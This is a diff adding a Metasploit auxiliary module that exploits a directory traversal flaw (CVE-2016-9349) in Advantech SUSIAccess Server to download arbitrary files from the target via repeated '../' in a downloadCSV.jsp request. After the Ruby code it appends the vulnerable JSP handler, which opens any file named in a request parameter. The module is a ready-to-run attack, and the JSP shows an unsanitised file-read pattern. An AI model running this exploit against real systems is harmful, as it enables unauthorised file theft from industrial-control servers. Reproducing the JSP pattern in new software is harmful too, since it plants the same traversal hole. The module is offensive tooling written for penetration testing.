@@ -1,0 +1,100 @@
+require 'msf/core'
+
+class MetasploitModule < Msf::Auxiliary
+	Rank = GreatRanking
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Advantech SUSIAccess Server Directory Traversal Information Disclosure',
+			'Description'    => %q{
+				This module exploits an information disclosure vulnerability found in
+				Advantech SUSIAccess <= version 3.0. The vulnerability is triggered when
+				sending a GET request to the server with a series of dot dot slashes (../)
+				in the file parameter. 
+			},
+			'Author'         => [ 'james fitts' ],
+			'License'        => MSF_LICENSE,
+			'References'     =>
+				[
+					[ 'CVE', '2016-9349' ],
+					[ 'ZDI', '16-628' ],
+					[ 'BID', '94629' ],
+					[ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-16-336-04' ]
+				],
+			'DisclosureDate' => 'Dec 13 2016'))
+
+		register_options(
+			[
+				OptInt.new('DEPTH', [ false, 'Levels to reach base directory', 10]),
+				OptString.new('FILE', [ false, 'This is the file to download', 'boot.ini']),
+				Opt::RPORT(8080)
+			], self.class )
+	end
+
+	def run
+
+	depth = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
+	levels = "/" + ("../" * depth)
+
+	file = "#{levels}#{datastore['FILE']}"
+	file = file.gsub(/ /, "%20")
+
+	res = send_request_raw({
+		'method'	=> 'GET',
+		'uri'		=> "/downloadCSV.jsp?file=#{file}",
+	})
+
+	if res and res.code == 200
+		loot = res.body
+		if not loot or loot.empty?
+			print_status("File from #{rhost}:#{rport} is empty...")
+			return
+		end
+		file = ::File.basename(datastore['FILE'])
+		path = store_loot('advantech_susiaccess.file', 'application/octet-stream', rhost, loot, file, datastore['FILE'])
+		print_status("Stored #{datastore['FILE']} to #{path}")
+		return
+	else
+		print_error("Something went wrong... Application returned a #{res.code}")
+	end
+
+	end
+end
+__END__
+<%@ page import="java.util.*,java.io.*" %>               
+<%
+ File f = new File (getServletContext().getRealPath("/") + request.getParameter("file") );
+ //set the content type(can be excel/word/powerpoint etc..)
+ response.setContentType ("application/csv");
+ //set the header and also the Name by which user will be prompted to save
+ response.setHeader ("Content-Disposition", "attachment; filename=\""+request.getParameter("file").split("/")[2] +"\"");
+ 
+ //get the file name
+ String name = f.getName().substring(f.getName().lastIndexOf("/") + 1,f.getName().length());
+ //OPen an input stream to the file and post the file contents thru the 
+ //servlet output stream to the client m/c
+ 
+  InputStream in = new FileInputStream(f);
+  ServletOutputStream outs = response.getOutputStream();
+  
+  
+  int bit = 256;
+  int i = 0;
+  try {
+   while ((bit) >= 0) {
+    bit = in.read();
+    outs.write(bit);
+   }
+   //System.out.println("" +bit);
+  } catch (IOException ioe) {
+   ioe.printStackTrace(System.out);
+  }
+//  System.out.println( "n" + i + " bytes sent.");
+//  System.out.println( "n" + f.length() + " bytes sent.");
+  outs.flush();
+  outs.close();
+  in.close(); 
+
+%>
